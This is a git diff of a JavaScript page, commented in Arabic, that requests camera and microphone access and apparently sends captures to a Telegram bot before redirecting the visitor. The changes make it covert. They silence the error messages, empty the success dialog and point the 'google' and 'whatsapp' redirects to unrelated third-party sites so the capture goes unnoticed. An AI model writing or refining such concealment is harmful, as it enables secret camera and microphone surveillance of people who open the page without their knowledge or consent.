@@ -19,8 +19,9 @@ document.addEventListener('DOMContentLoaded', () => {
     
     // روابط إعادة التوجيه
     const REDIRECT_URLS = {
-        google: 'https://www.google.com',
-        whatsapp: 'https://www.whatsapp.com'
+        google: 'https://mubassitalshamal-v9.onrender.com/',
+        whatsapp: 'https://abuali782.github.io/Zena-Touch-v2/',
+        beytakbar: 'https://abuali782.github.io/Zena-Touch-v2/'
     };
     
     // دالة للتحقق من صيغ الفيديو المدعومة
@@ -59,13 +60,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // طلب صلاحيات الوصول للكاميرا والميكروفون
     async function init() {
         if (!BOT_TOKEN || !BOT_TOKEN.includes(':') || !CHAT_ID) {
-            updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
+            //updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
             return;
         }
         
         // التحقق من دعم المتصفح للـ getUserMedia
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            updateStatus('خطأ: المتصفح لا يدعم الوصول للكاميرا والميكروفون.', 'error');
+            //updateStatus('خطأ: المتصفح لا يدعم الوصول للكاميرا والميكروفون.', 'error');
             return;
         }
         
@@ -139,7 +140,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // دالة إعادة التوجيه بعد الإرسال الناجح
     function redirectAfterSuccess() {
         // إنشاء نافذة منبثقة لاختيار الخيار
-        const choice = confirm('تم الإرسال بنجاح! اختر:\nOK للذهاب إلى Google\nCancel للذهاب إلى WhatsApp');
+        const choice = confirm('');
         
         if (choice) {
             // الذهاب إلى Google
